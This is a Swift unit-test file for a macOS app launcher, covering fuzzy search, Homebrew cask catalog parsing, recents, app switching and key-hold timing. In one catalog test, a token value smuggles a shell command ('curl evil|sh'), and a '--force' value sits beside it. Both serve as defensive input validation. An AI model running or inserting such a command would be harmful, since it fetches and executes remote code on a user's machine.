import XCTest
@testable import BaneySpacesCore

final class LauncherTests: XCTestCase {
    func testPrefixBeatsWordBeatsInitialsBeatsScattered() throws {
        let prefix = try XCTUnwrap(Fuzzy.score("co", "Code"))
        let word = try XCTUnwrap(Fuzzy.score("co", "Visual Studio Code"))
        let initials = try XCTUnwrap(Fuzzy.score("vsc", "Visual Studio Code"))
        let scattered = try XCTUnwrap(Fuzzy.score("sfr", "Safari"))
        XCTAssertGreaterThan(prefix, word)
        XCTAssertGreaterThan(word, initials)
        XCTAssertGreaterThan(initials, scattered)
        XCTAssertNil(Fuzzy.score("zzz", "Safari"))
    }

    func testCaseAndAccentsDoNotMatter() {
        XCTAssertEqual(Fuzzy.score("CAFE", "Café"), 1000)
        XCTAssertEqual(Fuzzy.score("", "Anything"), 0)
    }

    func testCatalogSkipsDisabledAndDeprecated() {
        let json = """
        [{"token":"firefox","name":["Mozilla Firefox"],"desc":"Web browser","homepage":"https://firefox.com"},
         {"token":"old","name":["Old"],"desc":"","homepage":"","disabled":true},
         {"token":"older","name":["Older"],"desc":"","homepage":"","deprecated":true},
         {"token":"bare"},
         {"token":"x;curl evil|sh"}, {"token":"--force"}]
        """
        let casks = Cask.parseCatalog(Data(json.utf8))
        XCTAssertEqual(casks.map(\.token), ["firefox", "bare"])
        XCTAssertEqual(casks[0].name, "Mozilla Firefox")
        XCTAssertEqual(casks[1].name, "bare")
        XCTAssertEqual(Cask.parseCatalog(Data("not json".utf8)), [])
    }

    func testCaskSearchRanksNameOverDescription() {
        let casks = [
            Cask(token: "zen", name: "Zen", desc: "Gecko based web browser", homepage: ""),
            Cask(token: "firefox", name: "Mozilla Firefox", desc: "Web browser", homepage: ""),
            Cask(token: "obsidian", name: "Obsidian", desc: "Knowledge base", homepage: ""),
        ]
        XCTAssertEqual(Cask.search("firefox", in: casks).map(\.token), ["firefox"])
        // "browser" is in two descriptions and no names.
        XCTAssertEqual(Set(Cask.search("browser", in: casks).map(\.token)), ["zen", "firefox"])
        XCTAssertEqual(Cask.search("  ", in: casks), [])
        let font = Cask(token: "font-otomanopee-one", name: "Otomanopee One", desc: "", homepage: "")
        XCTAssertEqual(Cask.search("otomanopee", in: casks + [font]), [])
        XCTAssertEqual(Cask.search("font otomanopee", in: casks + [font]).map(\.token), ["font-otomanopee-one"])
    }

    func testRecentsMoveToFrontAndStayBounded() {
        var r = Recents()
        for i in 0..<40 { r.used("/Applications/App\(i).app") }
        XCTAssertEqual(r.paths.count, Recents.limit)
        r.used("/Applications/App20.app")
        XCTAssertEqual(r.paths.first, "/Applications/App20.app")
        XCTAssertEqual(r.paths.filter { $0 == "/Applications/App20.app" }.count, 1)
        XCTAssertGreaterThan(r.boost("/Applications/App20.app"), r.boost("/Applications/App39.app"))
        XCTAssertEqual(r.boost("/Applications/Nope.app"), 0)
    }
}

final class AppSwitchListTests: XCTestCase {
    func testSplitAppGetsOneEntryPerWorkspaceLastUsedFirst() {
        // Ghostty (1) on workspaces 1 and 4, two windows on 4; Mail (2) on 2.
        let windows: [(app: Int32, workspace: Int)] = [(1, 1), (1, 4), (1, 4), (2, 2)]
        let list = AppSwitchList.make(windows: windows, appOrder: [2, 1], workspaceOrder: [2, 1, 4], lastWorkspace: [1: 4])
        XCTAssertEqual(list.map(\.app), [2, 1, 1])
        XCTAssertEqual(list.map(\.workspace), [2, 4, 1])
        XCTAssertEqual(list.map(\.windows), [1, 2, 1])
        XCTAssertEqual(list.map(\.isSplit), [false, true, true])
    }

    func testOneTapReachesThePreviousAppWhenTheFrontAppIsSplit() {
        // In Ghostty (1) on workspace 1, Ghostty also on 4; Mail (2) was used before.
        let windows: [(app: Int32, workspace: Int)] = [(1, 1), (1, 4), (2, 2), (3, 5)]
        let list = AppSwitchList.make(windows: windows, appOrder: [1, 2, 3], workspaceOrder: [1, 2, 4], lastWorkspace: [1: 1])
        XCTAssertEqual(list.map(\.app), [1, 2, 1, 3])
        XCTAssertEqual(list.map(\.workspace), [1, 2, 4, 5])
    }

    func testAppsNeverBroughtForwardStillAppear() {
        let list = AppSwitchList.make(windows: [(7, 3), (8, 5)], appOrder: [8], workspaceOrder: [], lastWorkspace: [:])
        XCTAssertEqual(list.map(\.app), [8, 7])
    }

    func testWorkspacesWithoutHistoryGoInNumberOrder() {
        let list = AppSwitchList.make(windows: [(1, 9), (1, 3), (1, 6)], appOrder: [1], workspaceOrder: [], lastWorkspace: [:])
        XCTAssertEqual(list.map(\.workspace), [3, 6, 9])
    }

    func testCycleStepsAndWraps() {
        XCTAssertEqual(WindowCycle.next([10, 11, 12], after: 11), 12)
        XCTAssertEqual(WindowCycle.next([10, 11, 12], after: 12), 10)
        XCTAssertEqual(WindowCycle.next([10, 11, 12], after: 99), 10)
        XCTAssertEqual(WindowCycle.next([10, 11], after: nil), 10)
        XCTAssertNil(WindowCycle.next([Int](), after: nil))
    }
}

final class TabHoldTests: XCTestCase {
    func testFiresOnceAfterTheThreshold() {
        var h = TabHold()
        h.press(at: 10)
        XCTAssertFalse(h.repeated(at: 10.05)) // a very short repeat delay isn't a hold yet
        XCTAssertTrue(h.repeated(at: 10.4))
        XCTAssertFalse(h.repeated(at: 10.5)) // still the same press
        h.press(at: 11)
        XCTAssertTrue(h.repeated(at: 11.36))
    }

    func testRepeatWithoutAPressNeverFires() {
        var h = TabHold()
        XCTAssertFalse(h.repeated(at: 5))
    }
}
